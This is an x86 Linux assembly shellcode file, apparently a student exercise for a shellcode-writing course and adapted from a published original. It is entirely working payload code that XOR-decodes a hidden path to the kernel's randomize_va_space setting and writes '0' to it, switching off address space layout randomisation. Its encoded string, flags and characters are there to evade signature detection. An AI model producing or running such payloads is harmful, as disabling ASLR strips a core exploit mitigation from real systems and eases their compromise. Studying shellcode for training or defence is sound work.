; Modified ASLR deactivation shellcode by fbcsec
; Original by Jean Pascal Pereira
; Original: http://shell-storm.org/shellcode/files/shellcode-813.php
; This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
; http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
; Student ID: SLAE - 1187

global _start

section .text

_start:

jmp callsc

sc:
pop esi                     ; pop pointer to encoded string
mov ebx, esi                ; copy pointer to ebx
xor ecx, ecx                ; empty eax, ecx, and edx
mul ecx

decodestr:                  ; simple xor decoder stub for encoded '/proc/sys/kernel/randomize_va_space' string.
xor byte [esi], 0x41
jz short decoded
inc esi
jmp decodestr

decoded:
mov [esi], byte al          ; null terminate decoded string

mov cl, 0x08
yet_another_loop:           ; Get 0x08 into EAX
inc eax
loop yet_another_loop

push word 0x1ab             ; push/pop encoded flags
pop ecx
add cx, 0x111               ; decode flags
int 0x80                    ; make open(2) syscall


push eax
pop ebx
push eax                    ; push the file descriptor (which when pushed in this way null terminates whatever is pushed to the stack afterwards)
mov dx,0x9f87               ; push the characters '0:', xor encoded and backwards
xor dx, 0xa5b7              ; decode '0:' characters
push dx                     ; push these to the stack
push esp                    ; save pointer to this data
pop ecx
xor esi, esi
mov esi, edx
inc edx                     ; write only one byte of the saved data
mov al,0x4
int 0x80                    ; make write(2) syscall

push byte 0x06
pop eax
int 0x80

mov al, 0x01
int 0x80                    ; make exit(2) syscall

callsc:
call sc
encoded_bytes: db 0x6e, 0x6e, 0x31, 0x33, 0x2e, 0x22, 0x6e, 0x32, 0x38, 0x32, 0x6e, 0x2a, 0x24, 0x33, 0x2f, 0x24, 0x2d, 0x6e, 0x33, 0x20, 0x2f, 0x25, 0x2e, 0x2c, 0x28, 0x3b, 0x24, 0x1e, 0x37, 0x20, 0x1e, 0x32, 0x31, 0x20, 0x22, 0x24, 0x41
